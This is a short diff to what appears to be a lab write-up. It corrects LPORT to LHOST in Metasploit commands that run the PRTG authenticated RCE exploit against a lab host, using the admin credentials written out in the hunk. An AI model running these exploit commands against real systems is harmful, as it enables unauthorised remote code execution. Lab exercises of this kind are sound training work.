@@ -118,7 +118,7 @@ Matching Modules
 
 use exploit/windows/http/prtg_authenticated_rce
 set RHOSTS 10.10.10.152
-set LPORT tun0
+set LHOST tun0
 set ADMIN_USERNAME prtgadmin
 set ADMIN_PASSWORD PrTg@dmin2019
 run
